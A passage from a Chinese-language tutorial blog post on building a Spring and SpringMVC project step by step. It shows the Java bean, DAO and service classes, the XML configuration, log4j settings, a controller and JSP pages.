class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="3-代码结构"><a href="#3-代码结构" class="headerlink" title="3. 代码结构"></a>3. 代码结构</h2><p>代码结构如下</p>
<p><img src="../images/pics/java/17.jpg"> </p>
<h3 id="3-1-java-bean"><a href="#3-1-java-bean" class="headerlink" title="3.1 java bean"></a>3.1 java bean</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Account</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Double money;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Double <span class="title">getMoney</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> money;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMoney</span><span class="params">(Double money)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.money = money;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Account&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, money=&quot;</span> + money +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="3-2-dao层"><a href="#3-2-dao层" class="headerlink" title="3.2 dao层"></a>3.2 dao层</h3><p>接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.domain.Account;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">AccountDao</span> </span>&#123;</span><br><span class="line">    <span class="comment">//查询所有账户</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Account&gt; <span class="title">findAll</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">//保存所有账户信息</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">(Account account)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="3-3-业务层"><a href="#3-3-业务层" class="headerlink" title="3.3 业务层"></a>3.3 业务层</h3><p>接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.domain.Account;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">AccountService</span> </span>&#123;</span><br><span class="line">    <span class="comment">//查询所有账户</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Account&gt; <span class="title">findAll</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">//保存所有账户信息</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">(Account account)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.domain.Account;</span><br><span class="line"><span class="keyword">import</span> com.shadowflow.service.AccountService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountServiceImpl</span> <span class="keyword">implements</span> <span class="title">AccountService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Account&gt; <span class="title">findAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;业务层:查询所有账户...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">(Account account)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;业务层：保存账户...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="3-4-web层-视图层"><a href="#3-4-web层-视图层" class="headerlink" title="3.4 web层(视图层)"></a>3.4 web层(视图层)</h3><figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.controller;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 账户web</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountController</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="4-Spring框架"><a href="#4-Spring框架" class="headerlink" title="4. Spring框架"></a>4. Spring框架</h2><h3 id="4-1-Spring配置文件"><a href="#4-1-Spring配置文件" class="headerlink" title="4.1 Spring配置文件"></a>4.1 Spring配置文件</h3><p>在resources下生成applicationContext.xml的Spring配置文件</p>
<p><img src="../images/pics/java/18.jpg"></p>
<p>添加自动生成的约束为如下，并且开始注解扫描。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:tx</span>=<span class="string">&quot;http://www.springframework.org/schema/tx&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/aop/spring-context.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/tx</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/tx/spring-tx.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 开启注解扫描，希望处理service和dao,controller不需要spring框架处理--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.shadowflow&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 配置controller注解不扫描 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>给service的实现类添加spring注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.domain.Account;</span><br><span class="line"><span class="keyword">import</span> com.shadowflow.service.AccountService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service(&quot;accountService&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountServiceImpl</span> <span class="keyword">implements</span> <span class="title">AccountService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Account&gt; <span class="title">findAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;业务层:查询所有账户...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">(Account account)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;业务层：保存账户...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="4-2-测试spring"><a href="#4-2-测试spring" class="headerlink" title="4.2 测试spring"></a>4.2 测试spring</h3><p>修改junit的pom配置文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">改为</span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>test类代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.service.AccountService;</span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestSpring</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//加载配置文件</span></span><br><span class="line">        ApplicationContext ac = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;classpath:applicationContext.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//获取对象</span></span><br><span class="line">        AccountService as = (AccountService) ac.getBean(<span class="string">&quot;accountService&quot;</span>);</span><br><span class="line">        <span class="comment">//调用方法</span></span><br><span class="line">        as.findAll();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行提示log4j配置文件</p>
<figure class="highlight mercury"><table><tr><td class="code"><pre><span class="line">log4j:WARN No appenders could be found for logger (org.springframework.core.env.StandardEnvironment).</span><br><span class="line">log4j:WARN Please <span class="keyword">initialize</span> the log4j system properly.</span><br><span class="line">业务层:查询所有账户...</span><br></pre></td></tr></table></figure>

<p>在resources目录下新建log4j.properties</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Set root category priority to INFO and its only appender to CONSOLE.</span></span><br><span class="line"><span class="comment">#log4j.rootCategory=INFO, CONSOLE            debug   info   warn error fatal</span></span><br><span class="line"><span class="attr">log4j.rootCategory</span>=info, CONSOLE, LOGFILE</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the enterprise logger category to FATAL and its only appender to CONSOLE.</span></span><br><span class="line"><span class="attr">log4j.logger.org.apache.axis.enterprise</span>=FATAL, CONSOLE</span><br><span class="line"></span><br><span class="line"><span class="comment"># CONSOLE is set to be a ConsoleAppender using a PatternLayout.</span></span><br><span class="line"><span class="attr">log4j.appender.CONSOLE</span>=org.apache.log4j.ConsoleAppender</span><br><span class="line"><span class="attr">log4j.appender.CONSOLE.layout</span>=org.apache.log4j.PatternLayout</span><br><span class="line"><span class="attr">log4j.appender.CONSOLE.layout.ConversionPattern</span>=%d&#123;ISO8601&#125; %-<span class="number">6</span>r [%<span class="number">15.15</span>t] %-<span class="number">5</span>p %<span class="number">30.30</span>c %x - %m\n</span><br><span class="line"></span><br><span class="line"><span class="comment"># LOGFILE is set to be a File appender using a PatternLayout.</span></span><br><span class="line"><span class="attr">log4j.appender.LOGFILE</span>=org.apache.log4j.FileAppender</span><br><span class="line"><span class="attr">log4j.appender.LOGFILE.File</span>=/tmp/axis.log</span><br><span class="line"><span class="attr">log4j.appender.LOGFILE.Append</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">log4j.appender.LOGFILE.layout</span>=org.apache.log4j.PatternLayout</span><br><span class="line"><span class="attr">log4j.appender.LOGFILE.layout.ConversionPattern</span>=%d&#123;ISO8601&#125; %-<span class="number">6</span>r [%<span class="number">15.15</span>t] %-<span class="number">5</span>p %<span class="number">30.30</span>c %x - %m\n</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再次查询无报错</p>
<h2 id="5-SpringMVC框架"><a href="#5-SpringMVC框架" class="headerlink" title="5. SpringMVC框架"></a>5. SpringMVC框架</h2><h3 id="5-1-配置前端控制器"><a href="#5-1-配置前端控制器" class="headerlink" title="5.1 配置前端控制器"></a>5.1 配置前端控制器</h3><p>在web.xml配置前端控制器</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 配置前端控制器--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--加载springmvc.xml配置文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:springmvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--启动服务器创建该servlet--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--解决中文乱码过滤器--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>characterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>characterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-2-SpingMVC配置"><a href="#5-2-SpingMVC配置" class="headerlink" title="5.2 SpingMVC配置"></a>5.2 SpingMVC配置</h3><p>在resources目录下添加springmvc.xml，补全约束</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc/spring-mvc.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>配置springmvc.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc/spring-mvc.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 开启注解扫描, 只扫描Controller注解--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.shadowflow&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--配置视图解析器对象--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;internalResourceViewResolver&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/pages/&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--过滤静态资源--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:resources</span> <span class="attr">mapping</span>=<span class="string">&quot;/css/&quot;</span> <span class="attr">location</span>=<span class="string">&quot;/css/**&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:resources</span> <span class="attr">mapping</span>=<span class="string">&quot;/images/&quot;</span> <span class="attr">location</span>=<span class="string">&quot;/images/**&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:resources</span> <span class="attr">mapping</span>=<span class="string">&quot;/js/&quot;</span> <span class="attr">location</span>=<span class="string">&quot;/js/**&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--开启SpringMVC注解的支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>删除index.jsp重新生成（默认的配置不全，没有编码信息等），并添加超链接</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;account/findALL&quot;</span>&gt;测试&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>在controller包下修改AccountController类的代码，添加<code>account/findALL</code>路由，并且返回list页面。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 账户web</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/account&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;findALL&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">findALL</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;表现层：查询所有账户...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;list&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在webapp/WEB-INF/pages目录下添加list.jsp</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h3&gt;查询所有的账户&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<h3 id="5-3-测试"><a href="#5-3-测试" class="headerlink" title="5.3 测试"></a>5.3 测试</h3><p>添加一个测试springmvc的服务</p>
<p><img src="../images/pics/java/21.jpg"></p>
<p><img src="../images/pics/java/20.jpg"></p>
<p>运行后</p>
<p><img src="../images/pics/java/22.jpg"> </p>
<p>点击测试</p>
<p><img src="../images/pics/java/23.jpg"> </p>
<p>后台运行结果</p>
<p><img src="../images/pics/java/24.jpg"> </p>
<p>说明springmvc正常运行</p>
<h2 id="6-Spring整合SpringMVC"><a href="#6-Spring整合SpringMVC" class="headerlink" title="6. Spring整合SpringMVC"></a>6. Spring整合SpringMVC</h2><p><img src="../images/pics/java/25.jpg"></p>
